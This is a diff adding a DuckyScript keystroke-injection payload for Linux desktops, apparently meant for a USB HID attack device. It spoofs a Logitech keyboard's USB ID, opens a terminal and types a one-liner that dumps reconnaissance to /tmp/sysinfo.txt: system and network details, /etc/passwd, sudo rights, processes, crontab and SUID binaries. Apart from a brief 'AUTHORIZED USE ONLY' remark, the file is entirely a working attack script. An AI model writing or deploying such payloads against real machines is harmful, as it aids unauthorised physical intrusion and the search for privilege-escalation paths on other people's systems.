@@ -1,0 +1,21 @@
+REM Title: Linux System Info Dump
+REM Author: Community
+REM Target: Linux (GNOME/KDE desktop)
+REM Description: Dumps system recon to /tmp/sysinfo.txt
+REM AUTHORIZED USE ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+REM Try GNOME terminal shortcut
+CTRL ALT t
+DELAY 1200
+
+STRING OUTPUT=/tmp/sysinfo.txt
+ENTER
+STRING { echo "=== UNAME ==="; uname -a; echo "=== ID ==="; id; echo "=== HOSTNAME ==="; hostname; echo "=== IP ==="; ip a; echo "=== USERS ==="; cat /etc/passwd; echo "=== SUDOERS ==="; sudo -l 2>/dev/null; echo "=== PROCESSES ==="; ps aux; echo "=== CRONTAB ==="; crontab -l 2>/dev/null; echo "=== SUID BINS ==="; find / -perm -4000 -type f 2>/dev/null; } > $OUTPUT
+ENTER
+DELAY 10000
+STRING echo "Saved to $OUTPUT"
+ENTER
